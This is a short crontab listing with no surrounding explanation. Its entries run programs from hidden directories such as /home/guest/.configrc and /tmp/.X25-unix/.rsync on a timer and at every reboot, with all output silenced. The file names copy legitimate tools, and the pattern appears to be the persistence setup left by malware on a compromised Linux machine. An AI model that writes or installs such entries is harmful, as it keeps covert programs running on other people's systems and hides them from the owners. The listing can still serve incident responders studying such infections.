1 1 */2 * * /home/guest/.configrc/a/upd>/dev/null 2>&1
@reboot /home/guest/.configrc/a/upd>/dev/null 2>&1
5 8 * * 0 /home/guest/.configrc/b/sync>/dev/null 2>&1
@reboot /home/guest/.configrc/b/sync>/dev/null 2>&1  
0 0 */3 * * /tmp/.X25-unix/.rsync/c/aptitude>/dev/null 2>&1
